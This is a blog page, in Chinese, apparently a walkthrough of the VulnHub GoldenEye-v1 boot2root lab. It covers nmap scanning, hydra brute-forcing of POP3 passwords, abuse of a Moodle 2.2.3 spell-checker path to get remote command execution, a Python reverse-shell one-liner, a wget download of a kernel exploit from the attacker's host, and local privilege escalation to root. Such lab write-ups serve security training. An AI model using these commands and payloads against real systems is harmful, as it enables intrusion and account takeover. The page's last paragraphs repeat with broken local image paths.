@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title> - Vampire blog</title><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta itemprop="name" content="">
+<meta itemprop="description" content="靶机介绍 该靶机为OSCP考试类型的boot2root靶机，目标为获取root权限并读取flag 靶机下载地址 https://download.vulnhub.com/goldeneye/GoldenEye-v1.ova
+靶机运行 靶机格式为ova，将tgz文件解压，使用VMware或者VirtualBox打开导入即可，导入过程中需要指定路径 信息收集 首先判断一下靶机的存活地址，直接使用nmap -sP 探测，发现靶机地址为10.10.10.133
+root@kali:~# nmap -sP 10.10.10.* Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-27 01:43 EST Nmap scan report for 10.10.10.1 Host is up (0.00038s latency). MAC Address: 00:50:56:C0:00:08 (VMware) Nmap scan report for 10.10.10.2 Host is up (0.00025s latency). MAC Address: 00:50:56:E2:1F:31 (VMware) Nmap scan report for 10.10.10.133 Host is up (0.00014s latency). MAC Address: 00:0C:29:4C:1F:FB (VMware) Nmap scan report for 10.">
+
+<meta itemprop="wordCount" content="763">
+
+
+
+<meta itemprop="keywords" content="" /><meta property="og:title" content="" />
+<meta property="og:description" content="靶机介绍 该靶机为OSCP考试类型的boot2root靶机，目标为获取root权限并读取flag 靶机下载地址 https://download.vulnhub.com/goldeneye/GoldenEye-v1.ova
+靶机运行 靶机格式为ova，将tgz文件解压，使用VMware或者VirtualBox打开导入即可，导入过程中需要指定路径 信息收集 首先判断一下靶机的存活地址，直接使用nmap -sP 探测，发现靶机地址为10.10.10.133
+root@kali:~# nmap -sP 10.10.10.* Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-27 01:43 EST Nmap scan report for 10.10.10.1 Host is up (0.00038s latency). MAC Address: 00:50:56:C0:00:08 (VMware) Nmap scan report for 10.10.10.2 Host is up (0.00025s latency). MAC Address: 00:50:56:E2:1F:31 (VMware) Nmap scan report for 10.10.10.133 Host is up (0.00014s latency). MAC Address: 00:0C:29:4C:1F:FB (VMware) Nmap scan report for 10." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://vampire-lab.github.io/posts/goldeneye-v1/" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content=""/>
+<meta name="twitter:description" content="靶机介绍 该靶机为OSCP考试类型的boot2root靶机，目标为获取root权限并读取flag 靶机下载地址 https://download.vulnhub.com/goldeneye/GoldenEye-v1.ova
+靶机运行 靶机格式为ova，将tgz文件解压，使用VMware或者VirtualBox打开导入即可，导入过程中需要指定路径 信息收集 首先判断一下靶机的存活地址，直接使用nmap -sP 探测，发现靶机地址为10.10.10.133
+root@kali:~# nmap -sP 10.10.10.* Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-27 01:43 EST Nmap scan report for 10.10.10.1 Host is up (0.00038s latency). MAC Address: 00:50:56:C0:00:08 (VMware) Nmap scan report for 10.10.10.2 Host is up (0.00025s latency). MAC Address: 00:50:56:E2:1F:31 (VMware) Nmap scan report for 10.10.10.133 Host is up (0.00014s latency). MAC Address: 00:0C:29:4C:1F:FB (VMware) Nmap scan report for 10."/>
+<link href='https://fonts.googleapis.com/css?family=Playfair+Display:700' rel='stylesheet' type='text/css'>
+	<link rel="stylesheet" type="text/css" media="screen" href="https://vampire-lab.github.io/css/normalize.css" />
+	<link rel="stylesheet" type="text/css" media="screen" href="https://vampire-lab.github.io/css/main.css" />
+
+        <link id="dark-scheme" rel="stylesheet" type="text/css" href="https://vampire-lab.github.io/css/dark.css" />
+
+	<script src="https://cdn.jsdelivr.net/npm/feather-icons/dist/feather.min.js"></script>
+		<script src="https://vampire-lab.github.io/js/main.js"></script>
+</head>
+
+<body>
+	<div class="container wrapper">
+		<div class="header">
+	
+		<div class="avatar">
+			<a href="https://vampire-lab.github.io/">
+				<img src="/images/im/t.png" alt="Vampire blog" />
+			</a>
+		</div>
+	
+	<h1 class="site-title"><a href="https://vampire-lab.github.io/">Vampire blog</a></h1>
+	<div class="site-description"><p>不去想是否能够成功,既然选择了远方,便只顾风雨兼程。</p><nav class="nav social">
+			<ul class="flat"><li><a href="https://github.com/vampire-lab" title="Github"><i data-feather="github"></i></a></li><li><a href="/index.xml" title="RSS"><i data-feather="rss"></i></a></li></ul>
+		</nav><span class="scheme-toggle"><a href="#" id="scheme-toggle"></a></div>
+
+	<nav class="nav">
+		<ul class="flat">
+			
+			<li>
+				<a href="/">Home</a>
+			</li>
+			
+			<li>
+				<a href="/posts">All posts</a>
+			</li>
+			
+			<li>
+				<a href="/about">About</a>
+			</li>
+			
+			<li>
+				<a href="/tags">Tags</a>
+			</li>
+			
+		</ul>
+	</nav>
+</div>
+
+
+		<div class="post">
+			<div class="post-header">
+				
+				<div class="matter">
+					<h1 class="title"></h1>
+				</div>
+			</div>
+					
+			<div class="markdown">
+				<h3 id="靶机介绍">靶机介绍</h3>
+<p>该靶机为OSCP考试类型的boot2root靶机，目标为获取root权限并读取flag
+靶机下载地址
+<code>https://download.vulnhub.com/goldeneye/GoldenEye-v1.ova</code></p>
+<h3 id="靶机运行">靶机运行</h3>
+<p>靶机格式为ova，将tgz文件解压，使用VMware或者VirtualBox打开导入即可，导入过程中需要指定路径
+<img src="/images/2019/GoldenEye-v1/3836de097a1facd41932e8d2b6715a57.png" alt="3836de097a1facd41932e8d2b6715a57.png"></p>
+<h3 id="信息收集">信息收集</h3>
+<p>首先判断一下靶机的存活地址，直接使用<code>nmap -sP</code> 探测，发现靶机地址为<code>10.10.10.133</code></p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">root@kali:~# nmap -sP 10.10.10.*
+Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-27 01:43 EST
+Nmap scan report for 10.10.10.1
+Host is up (0.00038s latency).
+MAC Address: 00:50:56:C0:00:08 (VMware)
+Nmap scan report for 10.10.10.2
+Host is up (0.00025s latency).
+MAC Address: 00:50:56:E2:1F:31 (VMware)
+Nmap scan report for 10.10.10.133
+Host is up (0.00014s latency).
+MAC Address: 00:0C:29:4C:1F:FB (VMware)
+Nmap scan report for 10.10.10.254
+Host is up (0.00014s latency).
+MAC Address: 00:50:56:EE:AC:53 (VMware)
+Nmap scan report for 10.10.10.132
+Host is up.
+Nmap done: 256 IP addresses (5 hosts up) scanned in 2.14 seconds
+</code></pre></div><p>探测靶机开放的服务和端口，使用命令<code>nmap -A -sV -p- 10.10.10.133</code>进行全端口扫描，发现开放了25、80、55006、55007，多个端口，其中有web服务、smtp服务、pop3服务</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">root@kali:~# nmap -A -sV -p- 10.10.10.133
+Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-27 01:43 EST
+Stats: 0:00:29 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+Service scan Timing: About 50.00% done; ETC: 01:44 (0:00:26 remaining)
+Nmap scan report for 10.10.10.133
+Host is up (0.00034s latency).
+Not shown: 65531 closed ports
+PORT      STATE SERVICE     VERSION
+25/tcp    open  smtp        Postfix smtpd
+|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
+|_ssl-date: TLS randomness does not represent time
+80/tcp    open  http        Apache httpd 2.4.7 ((Ubuntu))
+|_http-server-header: Apache/2.4.7 (Ubuntu)
+|_http-title: GoldenEye Primary Admin Server
+55006/tcp open  ssl/unknown
+|_ssl-date: TLS randomness does not represent time
+55007/tcp open  pop3        Dovecot pop3d
+|_pop3-capabilities: PIPELINING SASL(PLAIN) RESP-CODES TOP AUTH-RESP-CODE UIDL CAPA STLS USER
+|_ssl-date: TLS randomness does not represent time
+MAC Address: 00:0C:29:4C:1F:FB (VMware)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.9
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.34 ms 10.10.10.133
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 112.91 seconds
+</code></pre></div><p>我们首先访问一下web服务
+<code>http://10.10.10.133</code>
+查提示需要访问/sev-home/进行登录
+<img src="/images/2019/GoldenEye-v1/eb998be134a2bde5df82e973b020575b.png" alt="eb998be134a2bde5df82e973b020575b.png"></p>
+<p>查看一下源码，没什么内容，有个js脚本
+<img src="/images/2019/GoldenEye-v1/70e58b4b92aa39f6e0fa0640d07cadad.png" alt="70e58b4b92aa39f6e0fa0640d07cadad.png"></p>
+<p>点击查看js脚本，其中有段HTML实体编码内容，并且通过提示说明，知道这个就是密码
+<img src="/images/2019/GoldenEye-v1/3dedbd38e4a9857eee9c299781363904.png" alt="3dedbd38e4a9857eee9c299781363904.png"></p>
+<p>使用burp自带的解码工具Decoder尝试解码，点击Smart decode得到密码为<code>InvincibleHack3r</code>，通过上面提示知道账号可能是<code>boris</code>
+<img src="/images/2019/GoldenEye-v1/b6378f1581df84fcf5f139ccad690a60.png" alt="b6378f1581df84fcf5f139ccad690a60.png"></p>
+<p>尝试登陆，用户名全小写登陆成功
+<img src="/images/2019/GoldenEye-v1/c14a510cc64a8010e1becf037c22209d.png" alt="c14a510cc64a8010e1becf037c22209d.png"></p>
+<p>提示中重点内容大概就是说，他将pop3服务配置非常用端口，这里可能是需要爆破pop3协议，不知道用户名是什么，按F12查看一下代码中的信息，发现natalya，boris两个账号名
+<img src="/images/2019/GoldenEye-v1/1952380407fccae101ed263998077a15.png" alt="1952380407fccae101ed263998077a15.png"></p>
+<p>将两个账号保存为user.txt，使用hydra进行爆破
+使用命令 <code>hydra -L user.txt -P /usr/share/wordlists/fasttrack.txt -s 55006 -e ns pop3s://10.10.10.133</code> 尝试了一下 只有55006端口可以爆破，但是登陆的时候使用的又是55007，不知道为什么，不了解pop3服务，爆破得到密码bird和secret1!
+<img src="/images/2019/GoldenEye-v1/93409120e7ae25d3b704f0ce5b99fee1.png" alt="93409120e7ae25d3b704f0ce5b99fee1.png"></p>
+<p>pop3的命令详情
+<a href="https://www.cnblogs.com/crystalray/p/3302121.html">https://www.cnblogs.com/crystalray/p/3302121.html</a></p>
+<p>使用nc去连接pop3服务，输入user xxx 确认，pass xxx 确认，登陆成功list列出收到的邮件，使用retr 加邮件序号读取邮件内容</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">root@kali:/opt/bj/goledeneye# nc 10.10.10.133 55007
++OK GoldenEye POP3 Electronic-Mail System
+user natalya
++OK
+pass bird
++OK Logged in.
+list
++OK 2 messages:
+1 631
+2 1048
+</code></pre></div><p>读取邮件内容，发现boris中没什么有用信息，在natalya中获取到一个用户名密码和一些提示</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">Return-Path: &lt;root@ubuntu&gt;
+X-Original-To: natalya
+Delivered-To: natalya@ubuntu
+Received: from root (localhost [127.0.0.1])
+	by ubuntu (Postfix) with SMTP id 17C96454B1
+	for &lt;natalya&gt;; Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
+Message-Id: &lt;20180425031956.17C96454B1@ubuntu&gt;
+Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
+From: root@ubuntu
+
+Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it&#39;s related to security...even if it&#39;s not, just enter it in under the guise of &#34;security&#34;...it&#39;ll get the change order escalated without much hassle :)
+
+Ok, user creds are:
+
+username: xenia
+password: RCP90rulez!
+
+Boris verified her as a valid contractor so just create the account ok?
+
+And if you didn&#39;t have the URL on outr internal Domain: severnaya-station.com/gnocertdir
+**Make sure to edit your host file since you usually work remote off-network....
+
+Since you&#39;re a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.
+</code></pre></div><p>根据提示信息进行配置，将<code>10.10.10.133    severnaya-station.com</code>内容追加到/etc/hosts中，其中<code>10.10.10.133</code>为靶机地址，根据自己真实情况变更，写入完成后需要重启浏览器否则不会生效
+<img src="/images/2019/GoldenEye-v1/bbe3f6336b21ab42f287f0e0d01a7580.png" alt="bbe3f6336b21ab42f287f0e0d01a7580.png"></p>
+<p>这样我们就可以直接访问<code>http://severnaya-station.com/gnocertdir</code>，出现了一个新的网站
+<img src="/images/2019/GoldenEye-v1/efd003c166f0b188a81f15f872c84b62.png" alt="efd003c166f0b188a81f15f872c84b62.png"></p>
+<p>我们使用邮件里面的账号密码尝试登陆，登陆成功
+<img src="/images/2019/GoldenEye-v1/8c05072e3ecb260f71e7971b0e4bd8b8.png" alt="8c05072e3ecb260f71e7971b0e4bd8b8.png"></p>
+<p>翻一下页面的内容，这是一个低权限的用户，发现一个邮件，Dr Doak发给Xenia的，并且提示说他的email name是doak
+<img src="/images/2019/GoldenEye-v1/41ab8c4a2e0d85e6d7a06114a8a84878.png" alt="41ab8c4a2e0d85e6d7a06114a8a84878.png"></p>
+<p>尝试爆破doak账号的密码，使用命令<code>hydra -l doak -P /usr/share/wordlists/fasttrack.txt -s 55006 -e ns -t 64 pop3s://10.10.10.133</code> ，得到密码goat
+<img src="/images/2019/GoldenEye-v1/4d1d1206cc12d2eccc5fb9eeb9d794b9.png" alt="4d1d1206cc12d2eccc5fb9eeb9d794b9.png"></p>
+<p>与上述邮件操作相同，我们又发现了一个账号密码</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">Return-Path: &lt;doak@ubuntu&gt;
+X-Original-To: doak
+Delivered-To: doak@ubuntu
+Received: from doak (localhost [127.0.0.1])
+	by ubuntu (Postfix) with SMTP id 97DC24549D
+	for &lt;doak&gt;; Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
+Message-Id: &lt;20180425034731.97DC24549D@ubuntu&gt;
+Date: Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
+From: doak@ubuntu
+
+James,
+If you&#39;re reading this, congrats you&#39;ve gotten this far. You know how tradecraft works right?
+
+Because I don&#39;t. Go to our training site and login to my account....dig until you can exfiltrate further information......
+
+username: dr_doak
+password: 4England!
+</code></pre></div><p>使用新的用户名密码，重新登录，登录成功后，翻到上传文件中有个<code>s3cret.txt</code>文件，打开查看内容,发现图片地址</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">007,
+
+I was able to capture this apps adm1n cr3ds through clear txt. 
+
+Text throughout most web apps within the GoldenEye servers are scanned, so I cannot add the cr3dentials here. 
+
+Something juicy is located here: /dir007key/for-007.jpg
+
+Also as you may know, the RCP-90 is vastly superior to any other weapon and License to Kill is the only way to play.
+</code></pre></div><p>我们拼接访问一下图片<code>http://10.10.10.133/dir007key/for-007.jpg</code>，发现一张图片，可能隐藏了什么信息
+<img src="/images/2019/GoldenEye-v1/503de03136c140b3593940e824a30aeb.png" alt="503de03136c140b3593940e824a30aeb.png"></p>
+<p>下载下来图片，然后使用exif查看信息，发现其中有段base64编码内容，解码得到<code>xWinter1995x!</code>，感觉可能是admin密码
+<img src="/images/2019/GoldenEye-v1/52312db52216adbe0134b83ee171cce0.png" alt="52312db52216adbe0134b83ee171cce0.png"></p>
+<p>尝试登陆admin，成功
+<img src="/images/2019/GoldenEye-v1/39312d76af17d0ce9ac396a12f17ae96.png" alt="39312d76af17d0ce9ac396a12f17ae96.png"></p>
+<p>通过收集信息判断该应用为moodle 2.2.3版本，通过搜索发现存在一个rce漏洞</p>
+<h3 id="漏洞利用">漏洞利用</h3>
+<p>找到msf脚本和手动进行利用的方式，根据搜索到的资料进行反弹shell，这里手动利用
+先建立一个监听
+<code>nc -lvvp 8888</code>
+第一步需要将
+<code>http://severnaya-station.com/gnocertdir/admin/settings.php?section=editorsettingstinymce</code>
+页面中的spell engine中的Google spell修改为PSpellShell
+然后进入
+<code>http://severnaya-station.com/gnocertdir/admin/settings.php?section=systempaths</code>
+修改Path to aspell 内容构造反弹shell</p>
+<p>nc和tcp的方式都试过了不能反弹，于是使用尝试使用python进行反弹shell</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.10.132&#34;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;
+</code></pre></div><p><img src="/images/2019/GoldenEye-v1/c6449b313869474970ac317017221fdf.png" alt="c6449b313869474970ac317017221fdf.png"></p>
+<p>修改完成后需要手动触发反弹shell，进入
+Page path</p>
+<pre><code>Home / ► Site pages / ► Site blogs / ► Blog entries
+</code></pre>
+<p>点击Add a new entry，在标题和内容中随意输入，然后点击红框按钮
+<img src="/images/2019/GoldenEye-v1/0187ac47ee6975209b07c2b9b88f944a.png" alt="0187ac47ee6975209b07c2b9b88f944a.png"></p>
+<p>反弹成功
+<img src="/images/2019/GoldenEye-v1/a4c3f6d08075d7ae0c65b3e248cd59c5.png" alt="a4c3f6d08075d7ae0c65b3e248cd59c5.png"></p>
+<p>使用python代码，实现可交互式shell
+<code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code></p>
+<h3 id="提权">提权</h3>
+<p>先查看一下系统内核版本</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">uname -a
+Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
+</code></pre></div><p>使用命令 searchsploit 3.13.0
+<img src="/images/2019/GoldenEye-v1/09ec53fea5db70d40eaf510dd1f64b51.png" alt="09ec53fea5db70d40eaf510dd1f64b51.png"></p>
+<p>在攻击上使用<code>python3 -m http.server</code>搭建简单的服务器，靶机使用<code>wget http://10.10.10.132:8000/37292.c</code>访问下载exp代码
+<img src="/images/2019/GoldenEye-v1/5f0e9494410837e0193cbd61b10be881.png" alt="5f0e9494410837e0193cbd61b10be881.png"></p>
+<p><img src="/images/2019/GoldenEye-v1/3f7d7267d181c87a0b9b8b30c7c29176.png" alt="3f7d7267d181c87a0b9b8b30c7c29176.png"></p>
+<p>下载成功
+<img src="/images/2019/GoldenEye-v1/21cd957c2a4b87f3f453715131140e14.png" alt="21cd957c2a4b87f3f453715131140e14.png"></p>
+<p>由于靶机没有gcc工具，我们只能使用cc来代替gcc进行编译（据说还可以用clang xxx.c -o xxxx）
+<img src="/images/2019/GoldenEye-v1/ae21f33502d9a6198b3ddd97fe019830.png" alt="ae21f33502d9a6198b3ddd97fe019830.png">
+<img src="/images/2019/GoldenEye-v1/c487ddc9d1222b7213303865e57db1e5.png" alt="c487ddc9d1222b7213303865e57db1e5.png"></p>
+<p>由于提权代码中使用gcc工具，所以执行会失败，提示找不到gcc
+<img src="/images/2019/GoldenEye-v1/f40314e397be9bd85512f4901e95f043.png" alt="f40314e397be9bd85512f4901e95f043.png"></p>
+<p>我们需要将代码中第143行进行修改，其中gcc改为cc即可
+<img src="/images/2019/GoldenEye-v1/4000f4b6b0ef463ada7586650169ccc7.png" alt="4000f4b6b0ef463ada7586650169ccc7.png"></p>
+<p>使用<code>cc 37292.c -o xxx</code> 进行编译，会产生告警可以忽略
+<img src="/images/2019/GoldenEye-v1/12c8f741c96ae97fb4914a83e768823c.png" alt="12c8f741c96ae97fb4914a83e768823c.png"></p>
+<p>查看代码权限，具备可执行权限
+<img src="/images/2019/GoldenEye-v1/d0df12db87a33307ed5285a2c8deec2d.png" alt="d0df12db87a33307ed5285a2c8deec2d.png"></p>
+<p>直接运行exp，执行完成后，查看当前权限，得到root权限
+<img src="/images/2019/GoldenEye-v1/ad9160a174bb2dd54d4cb1313c12227c.png" alt="ad9160a174bb2dd54d4cb1313c12227c.png"></p>
+<p>拿到flag
+<img src="/images/2019/GoldenEye-v1/ba61f9c2a2b073f1b2222a546b78337e.png" alt="ba61f9c2a2b073f1b2222a546b78337e.png"></p>
+<p>访问一下<code>http://10.10.10.133/006-final/xvf7-flag/index.html</code></p>
+<p><img src="/images/2019/GoldenEye-v1/9796df484326fe3819de279d57065d3e.png" alt="9796df484326fe3819de279d57065d3e.png"></p>
+<p>该地址在html路径下，我们其实可以直接找到该路径直接访问
+<img src="/images/2019/GoldenEye-v1/19b38aead9367126dd5e7229cf13753c.png" alt="19b38aead9367126dd5e7229cf13753c.png"></p>
+<p>log\static\images\2019\GoldenEye-v1/ba61f9c2a2b073f1b2222a546b78337e.png)</p>
+<p>访问一下<code>http://10.10.10.133/006-final/xvf7-flag/index.html</code></p>
+<p><img src="D:%5Cblog%5Cstatic%5Cimages%5C2019%5CGoldenEye-v1/9796df484326fe3819de279d57065d3e.png" alt="9796df484326fe3819de279d57065d3e.png"></p>
+<p>该地址在html路径下，我们其实可以直接找到该路径直接访问
+<img src="D:%5Cblog%5Cstatic%5Cimages%5C2019%5CGoldenEye-v1/19b38aead9367126dd5e7229cf13753c.png" alt="19b38aead9367126dd5e7229cf13753c.png"></p>
+
+			</div>
+
+			<div class="tags">
+				
+					
+				
+			</div>
+
+
+		</div>
+	</div>
+	<div class="footer wrapper">
+	<nav class="nav">
+		<div>1  © Copyright notice |  <a href="https://github.com/knadh/hugo-ink">Ink</a> theme on <a href="https://gohugo.io">Hugo</a></div>
+	</nav>
+</div>
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-123-45', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+<script>feather.replace()</script>
+</body>
+</html>
